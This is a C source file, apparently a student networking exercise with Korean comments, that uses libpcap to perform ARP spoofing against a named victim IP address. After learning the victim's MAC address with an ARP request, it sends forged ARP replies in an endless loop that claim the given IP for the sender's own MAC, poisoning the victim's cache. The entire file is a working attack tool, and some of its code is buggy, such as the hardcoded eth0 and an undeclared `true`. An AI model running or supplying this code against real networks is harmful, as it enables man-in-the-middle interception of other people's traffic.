#include<stdio.h>
#include<stdint.h>
#include<stdlib.h>
#include<string.h>
#include<arpa/inet.h>
#include<pcap.h>
#include<memory.h>

#define ETH_HW_ADDR_LEN 6
#define IP_ADDR_LEN     4
#define ARP_FRAME_TYPE  0x0806
#define ETHER_HW_TYPE   0x0001
#define IP_PROTO_TYPE   0x0800
#define OP_ARP_REQUEST  0x0002
#define OP_TYPE_REQUEST 0x0001
#define OP_TYPE_REPLY	0x0002



struct arp_pk {
	 uint8_t DES_MAC[ETH_HW_ADDR_LEN];
	 uint8_t SRC_MAC[ETH_HW_ADDR_LEN];
	 uint16_t ETH_TYPE;
	 uint16_t HW_TYPE;
	 uint16_t PRO_TYPE;
	 uint8_t  HW_SIZE;
	 uint8_t PRO_SIZE;
	 uint16_t OP;
	 uint8_t  SENDER_MAC[ETH_HW_ADDR_LEN];
	 uint8_t  SENDER_IP[IP_ADDR_LEN];
	 uint8_t  TARGET_MAC[ETH_HW_ADDR_LEN];
	 uint8_t  TARGET_IP[IP_ADDR_LEN];
};





int main(int argc, char* argv[]){



	if(argc != 4) {
	printf("error, it should be like this : ./send_arp interface my_ip victim_ip\n");
	return -1;
	}

	printf("%s, %s\n",argv[2],argv[3]);


	unsigned int iMac[6];
	uint8_t mac[6];
	int i;
	struct arp_pk arp_pk;

	FILE *fp2;
      
	fp2 = fopen("/sys/class/net/eth0/address","r");//input파일 읽기로 열어서
	
	fscanf(fp2, "%x:%x:%x:%x:%x:%x", &iMac[0], &iMac[1], &iMac[2], &iMac[3], &iMac[4], &iMac[5]);


	for(i=0;i<6;i++)
	{
	    mac[i] = (uint8_t)iMac[i]; // insert my mac addr to mac[i] 	
		
		arp_pk.SRC_MAC[i] = mac[i];
		arp_pk.SENDER_MAC[i] = mac[i];
		printf("%x ",arp_pk.SENDER_MAC[i]);
	}

	fclose(fp2);
	
	printf("\n");
	


// 공격자 MAC 얻기위하여 ARP Request 용
		arp_pk.DES_MAC[0] = '\xff';
	arp_pk.TARGET_MAC[0] = '\x00';
		arp_pk.DES_MAC[1] = '\xff';
	arp_pk.TARGET_MAC[1] = '\x00';
		arp_pk.DES_MAC[2] = '\xff';
	arp_pk.TARGET_MAC[2] = '\x00';
		arp_pk.DES_MAC[3] = '\xff';
	arp_pk.TARGET_MAC[3] = '\x00';
		arp_pk.DES_MAC[4] = '\xff';
	arp_pk.TARGET_MAC[4] = '\x00';
		arp_pk.DES_MAC[5] = '\xff';
	arp_pk.TARGET_MAC[5] = '\x00';

	arp_pk.ETH_TYPE = htons(ARP_FRAME_TYPE);
	arp_pk.HW_TYPE = htons(ETHER_HW_TYPE);
	arp_pk.PRO_TYPE = htons(IP_PROTO_TYPE);
	arp_pk.HW_SIZE = ETH_HW_ADDR_LEN;
	arp_pk.PRO_SIZE = IP_ADDR_LEN;
	arp_pk.OP = htons(OP_TYPE_REQUEST);



		uint32_t num32 = inet_addr(argv[2]);

	 arp_pk.SENDER_IP[0] = num32;       
	 arp_pk.SENDER_IP[1] = num32 >> 8;  
	 arp_pk.SENDER_IP[2] = num32 >> 16; 
	 arp_pk.SENDER_IP[3] = num32 >> 24; 

        printf("inet_addr    : %s => %x %x %x %x\n", argv[2], arp_pk.SENDER_IP[0],arp_pk.SENDER_IP[1],arp_pk.SENDER_IP[2],arp_pk.SENDER_IP[3]);


        uint32_t num_32 = inet_addr(argv[3]);

	 arp_pk.TARGET_IP[0] = num_32;       
	 arp_pk.TARGET_IP[1] = num_32 >> 8;  
	 arp_pk.TARGET_IP[2] = num_32 >> 16; 
	 arp_pk.TARGET_IP[3] = num_32 >> 24; 

        printf("inet_addr    : %s => %x %x %x %x\n", argv[3], arp_pk.TARGET_IP[0],arp_pk.TARGET_IP[1],arp_pk.TARGET_IP[2],arp_pk.TARGET_IP[3]);
	








	u_char *packet;
	packet = (u_char *)malloc(sizeof(u_char) * 42);
	memset(packet, 0, 42);

	pcap_t *handle;			
	char errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr *header;



	memcpy(packet, &arp_pk, sizeof(arp_pk));

	char* dev = argv[1];

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL) 
	{
		fprintf(stderr, "Couldn't open device %s: %s\n",dev , errbuf);
		return -2;
	}	




	if(pcap_sendpacket(handle, packet, 42) != 0)
			fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));

	// 하나 보내고 이제 남은 packet 값지정? 다시 해줘야댐


	while (true) {
	
	u_char eth[3][6];
    int j = 6;
    struct pcap_pkthdr* header;
    const u_char* packet2;
    int res = pcap_next_ex(handle, &header, &packet2);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    for(int i = 0; i < header -> len; i++){
   
      if(i < 14 ){
        eth[i%j][i - (i%j)*6] = packet2[i]; 
      }

    }
    


    printf("\n");
    if(eth[2][0]==0x08 && eth[2][1]==0x06 && packet2[26] == arp_pk.TARGET_IP[0] && packet2[27] == arp_pk.TARGET_IP[1] && packet2[28] == arp_pk.TARGET_IP[2] && packet2[29] == arp_pk.TARGET_IP[3] ){
    	printf("FIND!!!!!!");




	  	// 새로운 ARP 스푸핑 위하여
			arp_pk.DES_MAC[0] = packet2[6];
		arp_pk.TARGET_MAC[0] = packet2[6];
			arp_pk.DES_MAC[1] = packet2[7];
		arp_pk.TARGET_MAC[1] = packet2[7];
			arp_pk.DES_MAC[2] = packet2[8];
		arp_pk.TARGET_MAC[2] = packet2[8];
			arp_pk.DES_MAC[3] = packet2[9];
		arp_pk.TARGET_MAC[3] = packet2[9];
			arp_pk.DES_MAC[4] = packet2[10];
		arp_pk.TARGET_MAC[4] = packet2[10];
			arp_pk.DES_MAC[5] = packet2[11];
		arp_pk.TARGET_MAC[5] = packet2[11];

		arp_pk.OP = htons(OP_TYPE_REPLY);
		
		memcpy(packet, &arp_pk, sizeof(arp_pk));
		//	


    	break;
    } // 이거랑 src ip 가 같으면 break


  }





	while(1)
	{
		printf("Send Packet\n");
		if(pcap_sendpacket(handle, packet, 42) != 0)
			fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));
	
	}


	return 0;
}

